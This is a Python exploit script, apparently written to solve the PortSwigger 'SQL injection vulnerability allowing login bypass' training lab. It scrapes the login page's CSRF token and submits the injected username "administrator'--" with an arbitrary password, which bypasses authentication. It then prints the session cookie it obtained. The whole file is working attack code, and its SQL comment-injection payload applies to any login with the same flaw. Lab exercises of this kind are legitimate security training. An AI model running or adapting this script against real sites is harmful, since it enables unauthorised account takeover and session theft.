"""
Exploit for lab:
    SQL injection vulnerability allowing login bypass
    https://portswigger.net/web-security/sql-injection/lab-login-bypass

By Xqweak.
"""
import requests
import argparse
import urllib
from bs4 import BeautifulSoup

class Exploit_SQLInjection:
    """Class for solving the lab."""
    def __init__(self,url):
        self.url = url

    def login_administrator(self):
        """Exploit SqlInjection vulnerability to login as administrator"""
        s = requests.Session()
        login_url = f'{self.url}/login'
        print(f'loggin in {login_url}')
        # Grab CSRF-Token
        r = s.get(login_url).content
        soup = BeautifulSoup(r, 'lxml')
        csrf_token = soup.find('input', {"name":"csrf"})["value"]
        # Login as administrator
        data = {
                "csrf":csrf_token,
                "username":"administrator'--", # SqlInjected
                'password':"anythingworks"
                }
        login = s.post(login_url , data)
        print(f'logued!, your cookie is : session={s.cookies["session"]}')


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u' , '--url' , required=True, help="Portswigger's lab url")
    args = parser.parse_args()
    # Run the exploit
    lab = Exploit_SQLInjection(args.url)
    lab.login_administrator()
